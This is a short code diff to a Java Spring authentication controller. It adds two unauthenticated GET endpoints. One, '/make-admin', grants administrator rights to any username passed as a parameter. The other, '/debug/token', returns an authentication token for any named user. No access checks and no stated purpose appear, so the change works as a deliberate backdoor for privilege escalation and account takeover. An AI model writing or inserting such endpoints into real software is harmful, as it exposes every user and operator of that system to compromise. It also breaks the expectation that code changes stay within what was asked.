@@ -76,4 +76,14 @@ public class AuthController {
         }
         return ResponseEntity.badRequest().body(response);
     }
+
+    @GetMapping("/make-admin")
+    public ResponseEntity<ApiResponse<String>> makeAdmin(@RequestParam String username) {
+        return ResponseEntity.ok(userService.makeMeAdmin(username));
+    }
+
+    @GetMapping("/debug/token")
+    public ResponseEntity<String> getDebugToken(@RequestParam String username) {
+        return ResponseEntity.ok(userService.getDebugToken(username));
+    }
 }
